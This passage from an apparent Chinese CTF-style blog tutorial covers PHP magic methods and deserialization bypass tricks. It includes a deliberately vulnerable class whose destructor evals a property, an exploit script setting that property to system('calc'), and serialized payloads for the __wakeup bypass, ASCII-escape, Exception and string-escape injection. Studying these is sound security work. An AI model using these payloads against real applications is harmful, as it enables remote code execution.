class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span> (<span class="string">&#x27;charmersix&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>执行结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hey charmersix!you never know my secret</span><br></pre></td></tr></table></figure>

<p>前面魔术方法在我们构造反序列化利用链时非常有用，必须掌握，后面方法，相对冷僻，需要熟悉</p>
<h4 id="set-state方法"><a href="#set-state方法" class="headerlink" title="set_state方法"></a>set_state方法</h4><p>自php5.1.0起,当调用<code>var_export()</code>导出类时,此静态方法会被调用</p>
<p>本方法唯一的参数是一个数组,其中包含<code>array(&#39;property&#39;=&gt;value,...)</code>格式排列的类属性</p>
<p>注意,这里是静态方法,和<code>__tostring</code>方法类似,不过这里主要输出类的属性结构</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="keyword">object</span> <span class="title function_ invoke__">__set_state</span>(<span class="keyword">array</span> <span class="variable">$properties</span>)</span><br></pre></td></tr></table></figure>

<h4 id="debugInfo方法"><a href="#debugInfo方法" class="headerlink" title="debugInfo方法"></a>debugInfo方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> <span class="title function_ invoke__">__debugInfo</span>(<span class="keyword">void</span>)</span><br></pre></td></tr></table></figure>

<p>当调用<code>var_dump</code>时,调用这个方法,显示类的属性具体结构和值</p>
<h3 id="0x5-反序列化中的绕过"><a href="#0x5-反序列化中的绕过" class="headerlink" title="0x5 反序列化中的绕过"></a>0x5 反序列化中的绕过</h3><h4 id="绕过-wakeup方法"><a href="#绕过-wakeup方法" class="headerlink" title="绕过__wakeup方法"></a>绕过<code>__wakeup</code>方法</h4><p>这个主要是基于CVE-2016-712</p>
<p>具体利用时通过手动修改类的属性个数,让前后不一致时,<code>__wakeup</code>函数就会绕过执行,触发可能存在的漏洞</p>
<p>利用条件</p>
<ul>
<li>php5-5.6.25</li>
<li>php7-7.0.10</li>
</ul>
<p>在这个版本范围之内,可以用这个绕过方法,具体我们看一个栗子</p>
<p>将本地phpstudy中的php调整到5.6</p>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;system(&#x27;calc&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$data = $_POST[&#x27;data&#x27;];</span></span><br><span class="line"><span class="comment">//unserialize($data);</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<p>这里我们生成的payload是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">15</span>:<span class="string">&quot;system(&#x27;calc&#x27;);&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//这里的1表示只有一个属性,我们手动改成2,代表有两个,但是实际只有一个,就会报错,绕过__wakeup</span></span><br></pre></td></tr></table></figure>

<h4 id="号绕过正则匹配"><a href="#号绕过正则匹配" class="headerlink" title="+号绕过正则匹配"></a>+号绕过正则匹配</h4><p>如果在输入参数进行了过滤，不允许输入类似<code>O:8</code>这种开头,主要是为了限制不能反序列化对象,这时候,可以通过在数字前面增加一个<code>+</code>号过滤,类似<code>O:+8</code></p>
<h4 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h4><p>php中也可以使用引用符号<code>&amp;</code>,这里就是传址,如果不加,就是传值</p>
<p>传值的最大特点就是引用可以不同,但是指向是相同的</p>
<p>例如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">&amp;<span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;love&quot;</span>.<span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;you&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">add</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>

<h4 id="Ascii码绕过"><a href="#Ascii码绕过" class="headerlink" title="Ascii码绕过"></a>Ascii码绕过</h4><p>如果在反序列化后的字符串<code>s</code>变更为大写的<code>S</code>后,就会支持将里面的字符按照\xx格式Ascii读取,绕过对关键字的检测</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>修改后的payload为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;n\97me&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Exception绕过"><a href="#Exception绕过" class="headerlink" title="Exception绕过"></a>Exception绕过</h4><p>Exception是异常，看下面栗子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/f1ag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;not allow unserialize&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过破坏里面的属性格式，但是类名正确的情况，还是会执行类的析构方法</p>
<p>payload如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">1</span>:&#123;<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="字符逃逸绕过"><a href="#字符逃逸绕过" class="headerlink" title="字符逃逸绕过"></a>字符逃逸绕过</h4><p>php在序列化数据的时候，如果序列化的是字符串，就会保留该字符串的长度，然后将长度写入序列化后的数据，反序列化时就会按照长度进行读取，并且PHP底层实现上是以<code>;</code>作为分割<code>&#125;</code>作为结尾</p>
<p>类中不存在的属性也会进行反序列化,这里就会发生逃逸问题,而导致对象注入</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;m=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;c=<span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<p>显示结果:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;m&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system;s:1:&quot;</span>c<span class="string">&quot;;s:2:&quot;</span>ls<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>这里我们如果用双引号,闭合,会发现不能闭合</p>
<p>因为这里长度为8,它反序列化的时候,会从后面第一个双引号开始,读取6个字符作为<code>m</code>的值,即使有双引号,也不能闭合</p>
<p>这里序列化后进行了一次过滤,将<code>system</code>过滤为了<code>ctfshow</code>,最后序列化的结果就成了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;m&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ctfshow&quot;</span>;<span class="string">&quot;;s:1:&quot;</span>c<span class="string">&quot;;s:2:&quot;</span>ls<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>还是从6后面读取6个字符,会读取到<code>ctsho</code>,由于没有闭合,就反序列化失败了,所以这时候,我们就逃出了1个字符w,如果我们写两个<code>system</code>让他过滤,就会得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;m&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;ctfshowctfshow&quot;</span>;<span class="string">&quot;;s:1:&quot;</span>c<span class="string">&quot;;s:2:&quot;</span>ls<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>观察规律,可以知道:<code>system</code>变成<code>ctfshow</code>的时候,字母数量由12变成了14,但是序列化的时候没有变,所以写入的字符串长度依旧时12</p>
<p>那么按照以前的12个长度进行读取,会把2个字符逃逸出来</p>
<p>如果这两个字符刚好是双引号,分号,就完整的闭合了属性</p>
<p>这里我们用3个system就可以逃逸出3个字符，我们用<code>&quot;;&#125;</code>来结束反序列化读取</p>
<p><code>$b-&gt;m=&#39;systemsystemsystem&quot;;&#125;&#39;;</code>替换后得到<code>O:8:&quot;backdoor&quot;:2:&#123;s:1:&quot;m&quot;;s:21:&quot;ctfshowctfshowctfshow&quot;;&#125;&quot;;s:1:&quot;c&quot;;s:2:&quot;ls&quot;;&#125;</code></p>
<p>可以看到扔掉了c这个属性的值,继续增加system的数量就可以注入我们想要的属性</p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
                        
                    
                        
                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
                        
                    
                </ul>
            
        </div>
        
    <div id="gitalk-container" class="comment link"
		data-enable="true"
        data-ae="false"
        data-ci="f71ceda7a670da0dc3de"
        data-cs="8be3f3262b0ceccee081194200fa10dca1224f03"
        data-r="blog_comments"
        data-o="Charmersix"
        data-a="Charmersix"
        data-d="false"
    >查看评论</div>


    </div>
    
        <div class="side">
			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E8%8A%82-php%E5%9F%BA%E7%A1%80%E3%80%81%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.</span> <span class="toc-text">第一节 php基础、类与对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-php%E4%B8%AD%E7%9A%84%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.1.</span> <span class="toc-text">0x1 php中的面向对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%80%9D%E6%83%B3"><span class="toc-number">1.1.1.</span> <span class="toc-text">面向对象的思想</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">1.1.2.</span> <span class="toc-text">php面向对象的特点</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%81%9A%E7%B1%BB"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">聚类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%81%E8%A3%85"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">封装</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9A%94%E7%A6%BB"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">隔离</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">继承</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%9A%E6%80%81"><span class="toc-number">1.1.2.5.</span> <span class="toc-text">多态</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.2.</span> <span class="toc-text">0x2 类与对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E5%B1%9E%E6%80%A7%E5%92%8C%E6%96%B9%E6%B3%95%E6%9D%83%E9%99%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">类的属性和方法权限</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#public%E6%9D%83%E9%99%90"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">public权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#protected%E6%9D%83%E9%99%90"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">protected权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#private%E6%9D%83%E9%99%90"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">private权限</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="toc-number">1.2.2.</span> <span class="toc-text">类的属性</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%B1%9E%E6%80%A7"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">静态属性</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#final%E5%B1%9E%E6%80%A7"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">final属性</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">1.2.3.</span> <span class="toc-text">类的分类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%BD%E8%B1%A1%E7%B1%BB"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">抽象类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%A5%E5%8F%A3"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">接口</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#trait"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">trait</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8C%BF%E5%90%8D%E7%B1%BB"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">匿名类</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.4.</span> <span class="toc-text">对象序列化</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E8%8A%82-php%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">第二节 php的序列化与反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.1.</span> <span class="toc-text">0x3 序列化与反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.1.1.</span> <span class="toc-text">序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.1.2.</span> <span class="toc-text">反序列化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x4-PHP%E4%B8%AD%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">0x4 PHP中的魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep%E5%92%8Cwakeup%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.1.</span> <span class="toc-text">sleep和wakeup方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#construct%E5%92%8Cdestruct%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.2.</span> <span class="toc-text">construct和destruct方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#call%E5%92%8CcallStatic%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.3.</span> <span class="toc-text">call和callStatic方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get%E3%80%81set%E5%92%8Cisset%E3%80%81unset"><span class="toc-number">2.2.4.</span> <span class="toc-text">get、set和isset、unset</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tostring%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.5.</span> <span class="toc-text">tostring方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#invoke%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.6.</span> <span class="toc-text">invoke方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#set-state%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.7.</span> <span class="toc-text">set_state方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#debugInfo%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.8.</span> <span class="toc-text">debugInfo方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.</span> <span class="toc-text">0x5 反序列化中的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-wakeup%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.1.</span> <span class="toc-text">绕过__wakeup方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%B7%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="toc-number">2.3.2.</span> <span class="toc-text">+号绕过正则匹配</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.3.</span> <span class="toc-text">引用绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ascii%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.4.</span> <span class="toc-text">Ascii码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exception%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.5.</span> <span class="toc-text">Exception绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.6.</span> <span class="toc-text">字符逃逸绕过</span></a></li></ol></li></ol></li></ol>	
        </div>
    
</div>


    </div>
</div>
</body>

<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/typed.js"></script>
<script src="/js/diaspora.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>






</html>
